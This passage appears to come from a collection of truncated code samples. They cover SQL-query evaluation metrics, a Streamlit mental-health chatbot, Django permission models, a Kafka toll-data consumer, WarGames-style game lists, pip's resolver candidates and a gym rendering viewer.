label_sel]\n    pred_total = len(pred_sel)\n    label_total = len(label_sel)\n    cnt = 0\n    cnt_wo_agg = 0\n\n    for unit in pred_sel:\n        if unit in label_sel:\n            cnt += 1\n            label_sel.remove(unit)\n        if unit[1] in label_wo_agg:\n            cnt_wo_agg += 1\n            label_wo_agg.remove(unit[1])\n\n    return label_total, pred_total, cnt, cnt_wo_agg\n\n\ndef eval_where(pred, label):\n    pred_conds = [unit for unit in pred['where'][::2]]\n    label_conds = [unit for unit in label['where'][::2]]\n    label_wo_agg = [unit[2] for unit in label_conds]\n    pred_total = len(pred_conds)\n    label_total = len(label_conds)\n    cnt = 0\n    cnt_wo_agg = 0\n\n    for unit in pred_conds:\n        if unit in label_conds:\n            cnt += 1\n            label_conds.remove(unit)\n        if unit[2] in label_wo_agg:\n            cnt_wo_agg += 1\n            label_wo_agg.remove(unit[2])\n\n    return label_total, pred_total, cnt, cnt_wo_agg\n\n\ndef eval_group(pred, label):\n    pred_cols = [unit[1] for unit in pred['groupBy']]\n    label_cols = [unit[1] for unit in label['groupBy']]\n    pred_total = len(pred_cols)\n    label_total = len(label_cols)\n    cnt = 0\n    pred_cols = [pred.split(\".\")[1] if \".\" in pred else pred for pred in pred_cols]\n    label_cols = [label.split(\".\")[1] if \".\" in label else label for label in label_cols]\n    for col in pred_cols:\n        if col in label_cols:\n            cnt += 1\n            label_cols.remove(col)\n    return label_total, pred_total, cnt\n\n\ndef eval_having(pred, label):\n    pred_total = label_total = cnt = 0\n    if len(pred['groupBy']) > 0:\n        pred_total = 1\n    if len(label['groupBy']) > 0:\n        label_total = 1\n\n    pred_cols = [unit[1] for unit in pred['groupBy']]\n    label_cols = [unit[1] for unit in label['groupBy']]\n    if pred_total == label_total == 1 \\\n            and pred_cols == label_cols \\\n            and pred['having'] == label['having']:\n        cnt = 1\n\n    return labe",
    "import streamlit as st\nfrom langchain.prompts import PromptTemplate\nimport os\nimport warnings\nwarnings.filterwarnings(\"ignore\")\nimport replicate\nfrom replicate.client import Client\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\nfrom langchain.document_loaders import DirectoryLoader\nfrom langchain.embeddings import SentenceTransformerEmbeddings\nfrom langchain.vectorstores import Chroma\nimport requests\nfrom bs4 import BeautifulSoup\nimport time\n\nst.set_page_config(page_title=\"WellNest\",\n                   page_icon=\"https://i.pinimg.com/564x/93/35/fa/9335fa24c3134c50dca440a06206f7d7.jpg\",\n                   \n                   layout=\"centered\",\n                   initial_sidebar_state=\"collapsed\")\n\n\npage_elements = \"\"\"\n<style>\n[data-testid=\"stAppViewContainer\"] {\n  background-image: url(\"https://i.pinimg.com/originals/8a/2d/fb/8a2dfb05b95555dba293ad3d3a3b03df.gif\");\n  background-size: cover;\n  color: white;\n}\n/* Hide audio controls */\naudio {\n  visibility: hidden;\n}\n::placeholder {\n  color: white;\n  opacity: 1;\n}\n.stTextInput label,\n.stSelectbox label {\n  color: white !important;\n  font-family: cursive;\n}\n</style>\n\"\"\"\n\n# Render page elements\nst.markdown(page_elements, unsafe_allow_html=True)\n\n\n# Embed audio using HTML audio tag with local file path\nst.markdown(\"\"\"\n<audio controls autoplay>\n  <source src=\"images/bgm.mp3\" type=\"audio/mp3\">\n  Your browser does not support the audio element.\n</audio>\n\"\"\", unsafe_allow_html=True)\n# Set the title text with custom CSS styling for color\nst.markdown(\n    \"\"\"\n    <h1 style=\"color:white;font-family: Georgia, serif;font-size:60px;font-weight:bold\">Well<span style=\"color:#ffcc66;font-style:italic;\">Nest</span></h1>\n    \"\"\",\n    unsafe_allow_html=True\n)\n\n# Apply custom styling using Markdown with HTML and CSS syntax\nst.markdown(\n    \"\"\"\n    <style>\n    ::placeholder { /* Change placeholder color */\n      color: white; /* Set the desired color */\n      opacity: 1; /* Set opacity to make the text fully visible */\n     \n    }\n    .stTextArea label { /* Change input label color */\n      color: white !important; /* Set the desired color */\n      font-family: cursive;\n    }\n   \n   \n    </style>\n    \"\"\",\n    unsafe_allow_html=True\n)\n\n\n\nimport streamlit as st\nimport time\nfont_size=20\n\n# Function to simulate a typing animation\ndef typewriter(text: str, speed: int):\n    tokens = text.split()\n    container = st.empty()\n    for index in range(len(tokens) + 1):\n        curr_full_text = \" \".join(tokens[:index])\n        container.markdown(f\"<span style='font-size:{font_size}px;font-family:cursive; color: #ffe6cc;'>{curr_full_text}</span>\", unsafe_allow_html=True)\n\n        time.sleep(50 / speed)\n\n# Main content\ntext_content = \"Hello !! I am WellNest, your compassionate guide to mental wellbeing and growth! Powered by the Llama Chat Model from Meta, I'm here to offer real-time support and insights on issues like anxiety, sleep disorders, depression, personality disorders, and more.\\n Feel free to reach out with any questions or concerns you may have\u2014I'm here to help you navigate your journey towards a healthier and happier life.\"\nspeed = 100\n\n# Check if typewriter animation has already been displayed\nif 'typewriter_ran' not in st.session_state:\n    st.session_state.typewriter_ran = True  # Set flag to indicate that the function has been executed\n    typewriter(text=text_content, speed=speed)\nelse:\n    # Display text directly without typing animation\n    st.markdown(f\"<span style='font-size:{font_size}px;color: #ffe6cc;'>{text_content}</span>\", unsafe_allow_html=True)\n\n\n\n\n\nsystem_prompt = \"You are a helpful, respectful and honest assistant. Always answer as helpfully as possible, while being safe. Your answers should not include any harmful, unethical, racist, sexist, toxic, dangerous, or illegal content. Please ensure that your responses are socially unbiased and positive in nature.\\n\\nIf a question does not make any sense, or is not factually coherent, explain why instead of answering something not correct. If you don't know the answer to a question, please don't share false information.\"\n\n\ndef blogs():\n      os.makedirs(\"data\", exist_ok=True)\n      with open(\"data/blog.txt\", \"a\", encoding=\"utf-8\") as blog_file:\n        for i in range(1, 6):  # Adjusted the range to fetch from 1 to 6 pages\n            url = f\"https://www.nami.org/Blogs/NAMI-Blog?page={i}\"\n            response = requests.get(url)\n\n            if response.status_code == 200:\n                soup = BeautifulSoup(response.content, 'html.parser')\n                col_divs = soup.find_all('div', class_='col-md-4 col-lg-3')\n\n                for div in col_divs:\n                    anchor_tags = div.find_all('a', href=True)\n\n                    for anchor in anchor_tags:\n                        blog_url = \"https://www.nami.org\" + anchor['href']\n                        blog_response = requests.get(blog_url)\n                        if blog_response.status_code == 200:\n                            blog_soup = Beaut",
    "from datetime import datetime, date\n\nfrom django.db import models\nfrom django.contrib.auth.models import AbstractUser\n\n\n# Create your models here.\nclass Router(models.Model):\n    \"\"\"\n    \u8def\u7531\n    \"\"\"\n\n    router_id = models.IntegerField(\n        default=0,\n        primary_key=True,\n        verbose_name=\"\u8def\u7531id\",\n        help_text=\"\u8def\u7531id\",\n    )\n    sub_router = models.ForeignKey(\n        \"self\",\n        on_delete=models.SET_NULL,\n        null=True,\n        blank=True,\n        verbose_name=\"\u4e0a\u7ea7\u8def\u7531\",\n        help_text=\"\u4e0a\u7ea7\u8def\u7531\",\n    )\n    path = models.CharField(\n        null=True, max_length=50, verbose_name=\"\u8def\u5f84\", help_text=\"\u8def\u5f84\"\n    )\n\n    component = models.CharField(\n        null=True, max_length=50, verbose_name=\"\u7ec4\u4ef6\u540d\u79f0\", help_text=\"\u7ec4\u4ef6\u540d\u79f0\"\n    )\n    redirect = models.CharField(\n        null=True, max_length=30, verbose_name=\"\u91cd\u5b9a\u5411\", help_text=\"\u91cd\u5b9a\u5411\"\n    )\n    hidden = models.BooleanField(\n        default=False, verbose_name=\"\u662f\u5426\u9690\u85cf\", help_text=\"\u662f\u5426\u9690\u85cf\"\n    )\n    name = models.CharField(\n        null=True, max_length=30, verbose_name=\"\u8def\u7531\u540d\", help_text=\"\u8def\u7531\u540d\"\n    )\n    title = models.CharField(\n        null=True, max_length=30, verbose_name=\"\u8def\u7531\u6807\u9898\", help_text=\"\u8def\u7531\u6807\u9898\"\n    )\n    icon = models.CharField(\n        null=True, max_length=50, verbose_name=\"\u56fe\u6807\", help_text=\"\u56fe\u6807\"\n    )\n\n    class Meta:\n        verbose_name = \"\u8def\u7531\"\n        verbose_name_plural = verbose_name\n\n    def __str__(self):\n        return self.title\n\n\nclass Permission(models.Model):\n    \"\"\"\n    \u6743\u9650\n    \"\"\"\n\n    # URL\u522b\u540d\n    name = models.CharField(\n        null=True, max_length=30, verbose_name=\"\u6743\u9650\u540d\u79f0\", help_text=\"\u6743\u9650\u540d\u79f0\"\n    )\n    method = models.CharField(\n        null=True, max_length=30, verbose_name=\"\u65b9\u6cd5\u7c7b\u578b\", help_text=\"\u65b9\u6cd5\u7c7b\u578b\"\n    )\n    desc = models.CharField(\n        null=True, max_length=300, verbose_name=\"\u63cf\u8ff0\", help_text=\"\u63cf\u8ff0\"\n    )\n    router = models.ForeignKey(\n        Router,\n        null=True,\n        on_delete=models.CASCADE,\n        verbose_name=\"\u6743\u9650\",\n        help_text=\"\u6743\u9650\",\n    )\n\n    class Meta:\n        verbose_name = \"\u6743\u9650\"\n        verbose_name_plural = verbose_name\n\n    def __str__(self):\n        return self.name\n\n\nclass Role(models.Model):\n    \"\"\"\n    \u89d2\u8272\n    \"\"\"\n\n    name = models.CharField(\n        null=True, max_length=30, verbose_name=\"\u89d2\u8272\u540d\u79f0\", help_text=\"\u89d2\u8272\u540d\u79f0\"\n    )\n    desc = models.CharField(\n        null=True, max_length=300, verbose_name=\"\u63cf\u8ff0\", help_text=\"\u63cf\u8ff0\"\n    )\n    permission = models.ManyToManyField(\n        Permission,\n        verbose_name=\"\u6743\u9650\",\n        help_text=\"\u6743\u9650\",\n    )\n\n    class Meta:\n        verbose_name = \"\u89d2\u8272\"\n        verbose_name_plural = verbose_name\n\n    def __str__(self):\n        return self.name\n\n\nclass UserProfile(AbstractUser):\n    \"\"\"\n    \u7528\u6237\n    \"\"\"\n\n    username = models.CharField(\n        max_length=30,\n        null=True,\n        blank=True,\n        unique=True,\n        verbose_name=\"\u59d3\u540d\",\n        help_text=\"\u59d3\u540d\",\n    )\n    avatar = models.CharField(\n        max_length=50,\n        verbose_name=\"\u7528\u6237\u5934\u50cf\",\n        help_text=\"\u7528\u6237\u5934\u50cf\",\n        default=\"https://m.imooc.com/static/wap/static/common/img/logo-small@2x.png\",\n    )\n    birthday = models.DateField(\n        null=True, blank=True, verbose_name=\"\u751f\u65e5\", help_text=\"\u751f\u65e5\"\n    )\n    address = models.CharField(\n        null=True, max_length=50, verbose_name=\"\u5bb6\u5ead\u5730\u5740\", help_text=\"\u5bb6\u5ead\u5730\u5740\"\n    )\n    mobile = models.CharField(max_length=11, verbose_name=\"\u624b\u673a\", help_text=\"\u624b\u673a\")\n    gender = models.CharField(\n        max_length=6,\n        choices=((\"male\", \"\u7537\"), (\"female\", \"\u5973\")),\n        default=\"female\",\n        verbose_name=\"\u6027\u522b\",\n        help_text=\"\u6027\u522b\",\n    )\n    email = models.CharField(\n        max_length=100, null=True, blank=True, verbose_name=\"\u90ae\u7bb1\", help_text=\"\u90ae\u7bb1\"\n    )\n\n    role = models.ManyToManyField(\n        Role,\n        verbose_name=\"\u89d2\u8272\",\n        help_text=\"\u89d2\u8272\",\n    )\n\n    add_time = models.DateField(\n        default=date.today,\n        verbose_name=\"\u6dfb\u52a0\u65f6\u95f4\",\n        help_text=\"\u6dfb\u52a0\u65f6\u95f4\",\n    )\n\n    def get_routers(self):\n        if self.is_anonymous:\n            routers = []\n            return routers\n        else:\n            # \u83b7\u53d6\u8be5\u7528\u6237\u6240\u6709\u89d2\u8272\n            roles = self.role.all()\n            # \u83b7\u53d6\u6240\u6709\u89d2\u8272\u7684\u6743\u9650\n            permissions = Permission.objects.filter(role__in=roles)\n            # \u83b7\u53d6\u6240\u6709\u6743\u9650\u7684\u5b50\u83dc\u5355\n            child_routers = Router.objects.filter(permission__in=permissions)\n            # \u83b7\u53d6\u6240\u6709\u7684\u4e0a\u7ea7\u83dc\u5355\n            sub_routers = Router.objects.filter(sub_router__isnull=True)\n            # \u83b7\u53d6\u6240\u6709\u6743\u9650\u7684\u4e0a\u7ea7\u83dc\u5355\n            routers = sub_routers.filter(\n                router_id__in=child_routers.values(\"sub_router_id\")\n            )\n            # \u5408\u5e76\u4e0a\u7ea7\u83dc\u5355\u548c\u5b50\u83dc\u5355\n            all_routers = routers | child_routers\n            return all_routers\n\n    class Meta:\n        verbose_name = \"\u7528\u6237\"\n        verbose_name_plural = verbose_name\n\n    def __str__(self):\n        return self.username\n\n\nclass SmsVerifyCode(models.Model):\n    \"\"\"\n    \u77ed\u4fe1\u9a8c\u8bc1\u7801\n    \"\"\"\n\n    code = models.CharField(\n        null=True, max_length=10, verbose_name=\"\u9a8c\u8bc1\u7801\", help_text=\"\u9a8c\u8bc1\u7801\"\n    )\n    mobile = models.CharField(\n        null=True, max_length=11, verbose_name=\"\u624b\u673a\", he",
    "#!/usr/bin/env python\n\n\"\"\"\nSCRIPT: streaming_data_reader.py\nAUTHOR: IBM\nDATE: 2022-09-21\nDESCRIPTION: Streaming data consumer\n\nAUDIT TRAIL START                               INIT  DATE\n----------------------------------------------  ----- -----------\n1. Initial version                              IBM   2022-09-21\n2. Updated constant variables                   PR    2024-04-11\n\nAUDIT TRAIL END\n\"\"\"\nimport os\nfrom datetime import datetime\nfrom kafka import KafkaConsumer\nimport mysql.connector\n\nTOPIC = 'toll'\nDATABASE = 'tolldata'\nUSERNAME = 'root'\nPASSWORD = os.environ.get(\"MYSQL_PASSWORD\")\n\nprint(\"Connecting to the database\")\ntry:\n    connection = mysql.connector.connect(host='localhost', database=DATABASE, user=USERNAME, password=PASSWORD)\nexcept Exception:\n    print(\"Could not connect to database. Please check credentials\")\nelse:\n    print(\"Connected to database\")\ncursor = connection.cursor()\n\nprint(\"Connecting to Kafka\")\nconsumer = KafkaConsumer(TOPIC)\nprint(\"Connected to Kafka\")\nprint(f\"Reading messages from the topic {TOPIC}\")\nfor msg in consumer:\n\n    # Extract information from kafka\n\n    message = msg.value.decode(\"utf-8\")\n\n    # Transform the date format to suit the database schema\n    (timestamp, vehcile_id, vehicle_type, plaza_id) = message.split(\",\")\n\n    dateobj = datetime.strptime(timestamp, '%a %b %d %H:%M:%S %Y')\n    timestamp = dateobj.strftime(\"%Y-%m-%d %H:%M:%S\")\n\n    # Loading data into the database table\n\n    sql = \"insert into livetolldata values(%s,%s,%s,%s)\"\n    result = cursor.execute(sql, (timestamp, vehcile_id, vehicle_type, plaza_id))\n    print(f\"A {vehicle_type} was inserted into the database\")\n    connection.commit()\nconnection.close()\n",
    "woprConcludes1= [\"A STRANGE GAME.\",\n                 \"THE ONLY WINNING MOVE IS\",\n                 \"NOT TO PLAY.\"]\nwoprConcludes2= [\"HOW ABOUT A NICE GAME OF CHESS?\"]\n\nwoprListGames= ['FALKEN\\'S MAZE',\n                'BLACK JACK',\n                'GIN RUMMY',\n                'HEARTS',\n                'BRIDGE',\n                'CHECKERS',\n                'CHESS',\n                'POKER',\n                'FIGHTER COMBAT',\n                'GUERRILLA ENGAGEMENT',\n                'DESERT WARFARE',\n                'AIR-TO-GROUND ACTIONS',\n                'THEATERWIDE TACTICAL WARFARE',\n                'THEATERWIDE BIOTOXIC AND CHEMICAL WARFARE',\n                'GLOBAL THERMONUCLEAR WAR']\n\nwoprListNukes= ['U.S. FIRST STRIKE',\n\t\t'USSR FIRST STRIKE',\n\t\t'NATO / WARSAW PACT',\n\t\t'FAR EAST STRATEGY',\n\t\t'US USSR ESCALATION',\n\t\t'MIDDLE EAST WAR',\n\t\t'USSR CHINA ATTACK',\n\t\t'INDIA PAKISTAN WAR',\n\t\t'MEDITERRANEAN WAR',\n\t\t'HONGKONG VARIANT',\n\t\t'SEATO DECAPITATING',\n\t\t'CUBAN PROVOCATION',\n\t\t'INADVERTENT INCIDENT',\n\t\t'U.S. DOMESTIC',\n\t\t'ATLANTIC HEAVY',\n\t\t'CUBAN PARAMILITARY',\n\t\t'NICARAGUAN PREEMPTIVE',\n\t\t'PACIFIC TERRITORIAL',\n\t\t'BURMESE THEATERWIOE',\n\t\t'TURKISH DECOY',\n\t\t'NATO ALERT',\n\t\t'ARGENTINA ESCALATION',\n\t\t'ICELAND MAXIMUM',\n\t\t'ARABIAN THEATERWIDE',\n\t\t'U.S. SUBVERSION',\n\t\t'AUSTRAILIAN MANEUVER',\n\t\t'ARABIAN DIVERSION',\n\t\t'NATO LIMITED',\n\t\t'SUDAN SURPRISE',\n\t\t'NATO TERRITORIAL',\n\t\t'ZAIRE ALLIANCE',\n\t\t'ICELANDIC INCIDENT',\n\t\t'ENGLISH ESCALATION',\n\t\t'ZAIRE CAMPAIGN',\n\t\t'EASTERN PARAMILITARY',\n\t\t'MIDDLE EAST HEAVY',\n\t\t'MEXICAN TAKEOVER',\n\t\t'SAUDI MANEUVER',\n\t\t'AFRICAN TERRITORIAL',\n\t\t'ETHIOPIAN ESCALATION',\n\t\t'CANADIAN INCIDENT',\n\t\t'TURKISH HEAVY',\n\t\t'NATO INCURSION',\n\t\t'U.S. DEFENCE',\n\t\t'CAMBODIAN HEAVY',\n\t\t'PACT MEDIAN',\n\t\t'ARCTIC MINIMAL',\n\t\t'MEXICAN DOMESTIC',\n\t\t'TAIWAN THEATERWIDE',\n\t\t'PACIFIC MANEUVER',\n\t\t'PORTUGAL REVOLUTION',\n\t\t'ALBANIAN DECOY',\n\t\t'PALISTANIAN LOCAL',\n\t\t'MOROCCAN MINIMAL',\n\t\t'BULGARIAN DIVERSION',\n\t\t'CZECH OPTION',\n\t\t'FRENCH ALLIANCE',\n\t\t'ARABIAN CLANDESTINE',\n\t\t'GABON REBELLION',\n\t\t'NORTHERN MAXIMUM',\n\t\t'ALGERIAN SURPRISE',\n\t\t'WELSH PARAMILITARY',\n\t\t'SEATO TAKEOVER',\n\t\t'HAWAIIAN ESCALATION',\n\t\t'IRANIAN MANEUVER',\n\t\t'NATO CONTAINMENT',\n\t\t'SWISS INCIDENT',\n\t\t'CUBAN MINIMAL',\n\t\t'CHAD ALERT',\n\t\t'ICELAND ESCALATION',\n\t\t'VIETNAMESE RETALIATIO',\n\t\t'SYRIAN PROVOCATION',\n\t\t'LIBYAN LOCAL',\n\t\t'GABON TAKEOVER',\n\t\t'ROMAINIAN WAR',\n\t\t'MIDDLE EAST OFFENSIVE',\n\t\t'DENMARK MASSIVE',\n\t\t'CHILE CONFRONTATION',\n\t\t'S.AFRICAN SUBVERSION',\n\t\t'USSR ALERT',\n\t\t'NICARAGUAN THRUST',\n\t\t'GREENLAND DOMESTIC',\n\t\t'ICELAND HEAVY',\n\t\t'KENYA OPTION',\n\t\t'PACIFIC DEFENSE',\n\t\t'UGANDA MAXIMUM',\n\t\t'THAI SUBVERSION',\n\t\t'ROMAINIAN STRIKE',\n\t\t'PAKISTAN SOVEREIGNTY',\n\t\t'AFGHAN MISDIRECTION',\n\t\t'THAI VARIATION',\n\t\t'NORTHERN TERRITORIAL',\n\t\t'POLISH PARAMILITARY',\n\t\t'S.AFRICAN OFFENSIVE',\n\t\t'PANAMA MISDIRECTION',\n\t\t'SCANDINAVIAN DOMESTIC',\n\t\t'JORDAN PREEMPTIVE',\n\t\t'ENGLISH THRUST',\n\t\t'BRUMESE MANEUVER',\n\t\t'SPAIN COUNTER',\n\t\t'ARABIAN OFFENSIVE',\n\t\t'CHAD INTERDICTION',\n\t\t'TAIWAN MISDIRECTION',\n\t\t'BANGLADESH THEATERWID',\n\t\t'ETHIOPIAN LOCAL',\n\t\t'ITALIAN TAKEOVER',\n\t\t'VIETNAMESE INCIDENT',\n\t\t'ENGLISH PREEMPTIVE',\n\t\t'DENMARK ALTERNATE',\n\t\t'THAI CONFRONTATION',\n\t\t'TAIWAN SURPRISE',\n\t\t'BRAZILIAN STRIKE',\n\t\t'VENEZUELA SUDDEN',\n\t\t'MAYLASIAN ALERT',\n\t\t'ISREAL DISCRETIONARY',\n\t\t'LIBYAN ACTION',\n\t\t'PALISTANIAN TACTIAL',\n\t\t'NATO ALTERNATE',\n\t\t'CYPRESS MANEUVER',\n\t\t'EGYPT MISDIRECTION',\n\t\t'BANGLADESH THRUST',\n\t\t'KENYA DEFENCE',\n\t\t'BANGLADESH CONTAINMEN',\n\t\t'VIETNAMESE STRIKE',\n\t\t'ALBANIAN CONTAINMENT',\n\t\t'GABON SURPRISE',\n\t\t'IRAQ SOVEREIGNTY',\n\t\t'VIETNAMESE SUDDEN',\n\t\t'LEBANON INTERDICTION',\n\t\t'TAIWAN DOMESTIC',\n\t\t'ALGERIAN SOVEREIGNTY',\n\t\t'ARABIAN STRIKE',\n\t\t'ATLANTIC SUDDEN',\n\t\t'MONGOLIAN THRUST',\n\t\t'POLISH DECOY',\n\t\t'ALASKAN DISCRETIONARY',\n\t\t'CANADIAN THRUST',\n\t\t'ARABIAN LIGHT',\n\t\t'S.AFRICAN DOMESTIC',\n\t\t'TUNISIAN INCIDENT',\n\t\t'MAYLASIAN MANEUVER',\n\t\t'JAMAICA DECOY',\n\t\t'MAYLASIAN MINIMAL',\n\t\t'RUSSIAN SOVEREIGNTY',\n\t\t'CHAD OPTION',\n\t\t'BANGLADESH WAR',\n\t\t'BURMESE CONTAINMENT',\n\t\t'ASIAN THEATERWIDE',\n\t\t'BULGARIAN CLANDESTINE',\n\t\t'GREENLAND INCURSION',\n\t\t'EGYPT SURGICAL',\n\t\t'CZECH HEAVY',\n\t\t'TAIWAN CONFRONTATION',\n\t\t'GREENLAND MAXIMUM',\n\t\t'UGANDA OFFENSIVE',\n\t\t'CASPIAN DEFENCE']\n",
    "import logging\nimport sys\nfrom typing import TYPE_CHECKING, Any, FrozenSet, Iterable, Optional, Tuple, Union, cast\n\nfrom pip._vendor.packaging.utils import NormalizedName, canonicalize_name\nfrom pip._vendor.packaging.version import Version\n\nfrom pip._internal.exceptions import (\n    HashError,\n    InstallationSubprocessError,\n    MetadataInconsistent,\n)\nfrom pip._internal.metadata import BaseDistribution\nfrom pip._internal.models.link import Link, links_equivalent\nfrom pip._internal.models.wheel import Wheel\nfrom pip._internal.req.constructors import (\n    install_req_from_editable,\n    install_req_from_line,\n)\nfrom pip._internal.req.req_install import InstallRequirement\nfrom pip._internal.utils.direct_url_helpers import direct_url_from_link\nfrom pip._internal.utils.misc import normalize_version_info\n\nfrom .base import Candidate, CandidateVersion, Requirement, format_name\n\nif TYPE_CHECKING:\n    from .factory import Factory\n\nlogger = logging.getLogger(__name__)\n\nBaseCandidate = Union[\n    \"AlreadyInstalledCandidate\",\n    \"EditableCandidate\",\n    \"LinkCandidate\",\n]\n\n# Avoid conflicting with the PyPI package \"Python\".\nREQUIRES_PYTHON_IDENTIFIER = cast(NormalizedName, \"<Python from Requires-Python>\")\n\n\ndef as_base_candidate(candidate: Candidate) -> Optional[BaseCandidate]:\n    \"\"\"The runtime version of BaseCandidate.\"\"\"\n    base_candidate_classes = (\n        AlreadyInstalledCandidate,\n        EditableCandidate,\n        LinkCandidate,\n    )\n    if isinstance(candidate, base_candidate_classes):\n        return candidate\n    return None\n\n\ndef make_install_req_from_link(\n    link: Link, template: InstallRequirement\n) -> InstallRequirement:\n    assert not template.editable, \"template is editable\"\n    if template.req:\n        line = str(template.req)\n    else:\n        line = link.url\n    ireq = install_req_from_line(\n        line,\n        user_supplied=template.user_supplied,\n        comes_from=template.comes_from,\n        use_pep517=template.use_pep517,\n        isolated=template.isolated,\n        constraint=template.constraint,\n        global_options=template.global_options,\n        hash_options=template.hash_options,\n        config_settings=template.config_settings,\n    )\n    ireq.original_link = template.original_link\n    ireq.link = link\n    ireq.extras = template.extras\n    return ireq\n\n\ndef make_install_req_from_editable(\n    link: Link, template: InstallRequirement\n) -> InstallRequirement:\n    assert template.editable, \"template not editable\"\n    ireq = install_req_from_editable(\n        link.url,\n        user_supplied=template.user_supplied,\n        comes_from=template.comes_from,\n        use_pep517=template.use_pep517,\n        isolated=template.isolated,\n        constraint=template.constraint,\n        permit_editable_wheels=template.permit_editable_wheels,\n        global_options=template.global_options,\n        hash_options=template.hash_options,\n        config_settings=template.config_settings,\n    )\n    ireq.extras = template.extras\n    return ireq\n\n\ndef _make_install_req_from_dist(\n    dist: BaseDistribution, template: InstallRequirement\n) -> InstallRequirement:\n    if template.req:\n        line = str(template.req)\n    elif template.link:\n        line = f\"{dist.canonical_name} @ {template.link.url}\"\n    else:\n        line = f\"{dist.canonical_name}=={dist.version}\"\n    ireq = install_req_from_line(\n        line,\n        user_supplied=template.user_supplied,\n        comes_from=template.comes_from,\n        use_pep517=template.use_pep517,\n        isolated=template.isolated,\n        constraint=template.constraint,\n        global_options=template.global_options,\n        hash_options=template.hash_options,\n        config_settings=template.config_settings,\n    )\n    ireq.satisfied_by = dist\n    return ireq\n\n\nclass _InstallRequirementBackedCandidate(Candidate):\n    \"\"\"A candidate backed by an ``InstallRequirement``.\n\n    This represents a package request with the target not being already\n    in the environment, and needs to be fetched and installed. The backing\n    ``InstallRequirement`` is responsible for most of the leg work; this\n    class exposes appropriate information to the resolver.\n\n    :param link: The link passed to the ``InstallRequirement``. The backing\n        ``InstallRequirement`` will use this link to fetch the distribution.\n    :param source_link: The link this candidate \"originates\" from. This is\n        different from ``link`` when the link is found in the wheel cache.\n        ``link`` would point to the wheel cache, while this points to the\n        found remote link (e.g. from pypi.org).\n    \"\"\"\n\n    dist: BaseDistribution\n    is_installed = False\n\n    def __init__(\n        self,\n        link: Link,\n        source_link: Link,\n        ireq: InstallRequirement,\n        factory: \"Factory\",\n        name: Optional[NormalizedName] = None,\n        version: Optional[CandidateVersion] = None,\n    ) -> None:\n        self._link = link\n        self._source_link = source_link\n        self._factory = factory",
    "\"\"\"\n2D rendering framework\n\"\"\"\nfrom __future__ import division\nimport os\nimport six\nimport sys\n\nif \"Apple\" in sys.version:\n    if 'DYLD_FALLBACK_LIBRARY_PATH' in os.environ:\n        os.environ['DYLD_FALLBACK_LIBRARY_PATH'] += ':/usr/lib'\n        # (JDS 2016/04/15): avoid bug on Anaconda 2.3.0 / Yosemite\n\nfrom gym.utils import reraise\nfrom gym import error\n\ntry:\n    import pyglet\nexcept ImportError as e:\n    reraise(suffix=\"HINT: you can install pyglet directly via 'pip install pyglet'. But if you really just want to install all Gym dependencies and not have to think about it, 'pip install -e .[all]' or 'pip install gym[all]' will do it.\")\n\ntry:\n    from pyglet.gl import *\nexcept ImportError as e:\n    reraise(prefix=\"Error occured while running `from pyglet.gl import *`\",suffix=\"HINT: make sure you have OpenGL install. On Ubuntu, you can run 'apt-get install python-opengl'. If you're running on a server, you may need a virtual frame buffer; something like this should work: 'xvfb-run -s \\\"-screen 0 1400x900x24\\\" python <your_script.py>'\")\n\nimport math\nimport numpy as np\n\nRAD2DEG = 57.29577951308232\n\ndef get_display(spec):\n    \"\"\"Convert a display specification (such as :0) into an actual Display\n    object.\n\n    Pyglet only supports multiple Displays on Linux.\n    \"\"\"\n    if spec is None:\n        return None\n    elif isinstance(spec, six.string_types):\n        return pyglet.canvas.Display(spec)\n    else:\n        raise error.Error('Invalid display specification: {}. (Must be a string like :0 or None.)'.format(spec))\n\nclass Viewer(object):\n    def __init__(self, width, height, display=None):\n        display = get_display(display)\n\n        self.width = width\n        self.height = height\n\n        self.window = pyglet.window.Window(width=width, height=height, display=display)\n        self.window.on_close = self.window_closed_by_user\n        self.geoms = []\n        self.onetime_geoms = []\n        self.transform = Transform()\n\n        glEnable(GL_BLEND)\n        # glEnable(GL_MULTISAMPLE)\n        glEnable(GL_LINE_SMOOTH)\n        # glHint(GL_LINE_SMOOTH_HINT, GL_DONT_CARE)\n        glHint(GL_LINE_SMOOTH_HINT, GL_NICEST)\n        glLineWidth(2.0)\n        glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA)\n\n    def close(self):\n        self.window.close()\n\n    def window_closed_by_user(self):\n        self.close()\n\n    def set_bounds(self, left, right, bottom, top):\n        #assert right > left and top > bottom\n        scalex = self.width/(right-left)\n        scaley = self.height/(top-bottom)\n        self.transform = Transform(\n            translation=(-left*scalex, -bottom*scaley),\n            scale=(scalex, scaley))\n\n    def add_geom(self, geom):\n        self.geoms.append(geom)\n\n    def add_onetime(self, geom):\n        self.onetime_geoms.append(geom)\n\n    def render(self, return_rgb_array=False):\n        glClearColor(1,1,1,1)\n        self.window.clear()\n        self.window.switch_to()\n        self.window.dispatch_events()\n        self.transform.enable()\n        for geom in self.geoms:\n            geom.render()\n        for geom in self.onetime_geoms:\n            geom.render()\n        self.transform.disable()\n        arr = None\n        if return_rgb_array:\n            buffer = pyglet.image.get_buffer_manager().get_color_buffer()\n            image_data = buffer.get_image_data()\n            arr = np.fromstring(image_data.data, dtype=np.uint8, sep='')\n            # In https://github.com/openai/gym-http-api/issues/2, we\n            # discovered that someone using Xmonad on Arch was having\n            # a window of size 598 x 398, though a 600 x 400 window\n            # was requested. (Guess Xmonad was preserving a pixel for\n            # the boundary.) So we use the buffer height/width rather\n            # than the requested one.\n            arr = arr.reshape(buffer.height, buffer.width, 4)\n            arr = arr[::-1,:,0:3]\n        self.window.flip()\n        self.onetime_geoms = []\n        return arr\n\n    # Convenience\n    def draw_circle(self, radius=10, res=30, filled=True, **attrs):\n        geom = make_circle(radius=radius, res=res, filled=filled)\n        _add_attrs(geom, attrs)\n        self.add_onetime(geom)\n        return geom\n\n    def draw_polygon(self, v, filled=True, **attrs):\n        geom = make_polygon(v=v, filled=filled)\n        _add_attrs(geom, attrs)\n        self.add_onetime(geom)\n        return geom\n\n    def draw_polyline(self, v, **attrs):\n        geom = make_polyline(v=v)\n        _add_attrs(geom, attrs)\n        self.add_onetime(geom)\n        return geom\n\n    def draw_line(self, start, end, **attrs):\n        geom = Line(start, end)\n        _add_attrs(geom, attrs)\n        self.add_onetime(geom)\n        return geom\n\n    def get_array(self):\n        self.window.flip()\n        image_data = pyglet.image.get_buffer_manager().get_color_buffer().get_image_data()\n        self.window.flip()\n        arr = np.fromstring(image_data.data, dtype=np.uint8, 